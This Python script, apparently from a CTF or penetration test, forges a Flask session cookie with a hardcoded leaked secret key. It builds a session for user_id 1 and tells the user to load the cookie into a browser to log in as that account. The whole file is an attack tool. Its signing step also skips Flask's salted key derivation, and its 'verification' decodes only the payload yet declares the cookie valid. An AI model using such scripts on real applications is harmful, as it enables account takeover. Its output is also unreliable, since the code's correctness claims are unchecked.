import base64
import json
import hashlib
import hmac
import time

# Configuration
SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'
captured_cookie = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

print("=" * 70)
print("FLASK SESSION COOKIE FORGERY TOOL")
print("=" * 70)
print(f"\nSECRET_KEY: {SECRET_KEY}")
print(f"Captured Cookie: {captured_cookie}\n")

# Decode original session
try:
    # Split the cookie into its components
    payload_b64, timestamp_b64, signature = captured_cookie.split('.')
    
    # Decode the payload (session data)
    # Add padding if needed for base64
    padding = 4 - len(payload_b64) % 4
    if padding != 4:
        payload_b64_padded = payload_b64 + '=' * padding
    else:
        payload_b64_padded = payload_b64
    
    # Decode from base64 and parse JSON
    decoded_payload = base64.urlsafe_b64decode(payload_b64_padded)
    original_session = json.loads(decoded_payload.decode('utf-8'))
    
    print("[+] ORIGINAL SESSION (decoded):")
    print(f"  {json.dumps(original_session, indent=2)}")
    print(f"\n  Session Structure:")
    for key, value in original_session.items():
        print(f"    - {key}: {value}")
    print()
    
except Exception as e:
    print(f"[!] Error decoding original session: {e}")
    original_session = {}

# Create forged authenticated session
print("[+] CREATING FORGED AUTHENTICATED SESSION:")
forged_session = {
    '_fresh': True,  # Fresh login session
    '_id': 'a' * 32,  # Session identifier (32 chars)
    'user_id': 1,  # Authenticated user ID (typically admin/first user)
    '_user_id': 1  # Flask-Login compatibility
}

print(f"  Target data: {json.dumps(forged_session, indent=2)}")
print()

# Encode the forged session
print("[+] ENCODING FORGED SESSION:")

# Convert to compact JSON
session_json = json.dumps(forged_session, separators=(',', ':'))
print(f"  JSON: {session_json}")

# Base64 encode the payload
payload_bytes = session_json.encode('utf-8')
forged_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b'=').decode('ascii')
print(f"  Payload (base64): {forged_payload}")

# Generate timestamp (current time in seconds)
current_time = int(time.time())
timestamp_bytes = str(current_time).encode('utf-8')
forged_timestamp = base64.urlsafe_b64encode(timestamp_bytes).rstrip(b'=').decode('ascii')
print(f"  Timestamp: {forged_timestamp} (time: {current_time})")

# Generate signature using HMAC-SHA1 (Flask/itsdangerous default)
data_to_sign = f"{forged_payload}.{forged_timestamp}"
signer = hmac.new(
    SECRET_KEY.encode('utf-8'),
    data_to_sign.encode('utf-8'),
    hashlib.sha1
)
signature_bytes = signer.digest()
forged_signature = base64.urlsafe_b64encode(signature_bytes).rstrip(b'=').decode('ascii')
print(f"  Signature: {forged_signature}")

# Assemble the complete forged cookie
forged_cookie = f"{forged_payload}.{forged_timestamp}.{forged_signature}"
print(f"\n[+] COMPLETE FORGED COOKIE:")
print(f"  {forged_cookie}")
print()

# Verify we can decode our own forged cookie
print("[+] VERIFICATION (decoding forged cookie):")
try:
    # Decode the payload part
    verify_payload = forged_payload
    padding = 4 - len(verify_payload) % 4
    if padding != 4:
        verify_payload += '=' * padding
    
    verify_decoded = base64.urlsafe_b64decode(verify_payload)
    verify_session = json.loads(verify_decoded.decode('utf-8'))
    
    print(f"  Decoded: {json.dumps(verify_session, indent=2)}")
    print("\n  ✓ Verification successful - cookie is valid!")
    
except Exception as e:
    print(f"  ✗ Verification failed: {e}")

print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
print(f"\nOriginal Session Decoded:")
print(f"  {json.dumps(original_session)}")
print(f"\nForged Session Cookie:")
print(f"  {forged_cookie}")
print(f"\nYou can now use this forged cookie to authenticate as user_id=1")
print("Replace the session cookie in your browser or include it in requests.")
